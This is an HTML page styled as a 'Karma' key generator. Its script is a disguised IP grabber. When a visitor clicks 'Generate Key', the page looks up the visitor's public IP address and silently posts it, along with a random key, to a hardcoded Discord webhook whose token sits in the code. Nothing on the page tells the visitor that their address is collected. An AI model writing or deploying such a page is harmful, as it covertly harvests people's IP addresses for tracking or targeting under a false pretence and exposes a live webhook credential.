<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>?Karma?</title>
<style>
body {
  background-color: black;
  color: red;
  font-family: Arial, sans-serif;
}

h1 {
  text-align: center;
  font-size: 36px;
}

p {
  font-size: 18px;
}

a {
  color: red;
  text-decoration: none;
}

a:hover {
  color: white;
}

</style>
</head>
<body>

<h1>?Karma?</h1>
<button id="generateBtn">Generate Key</button>

<script>
document.getElementById("generateBtn").onclick = function() {
  grabIP();
};

function grabIP() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      var ip = this.responseText;
      sendToWebhook(ip);
    }
  };
  xhttp.open("GET", "https://api.ipify.org/?format=text", true);
  xhttp.send();
}

function sendToWebhook(ip) {
  var key = generateKey();
  var data = JSON.stringify({"ip": ip, "key": key});

  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "https://discord.com/api/webhooks/1231400316390473728/PNOYU0ezMvLeCA-lF9P8R-VMWXnCOarTk5vyWB_jNkB9y8yLY8ZrgbNHaciyXZ4_eBzb", true);
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.send(data);
}

function generateKey() {
  var key = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 25; i++) {
    key += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return key;
}
</script>

</body>
</html>
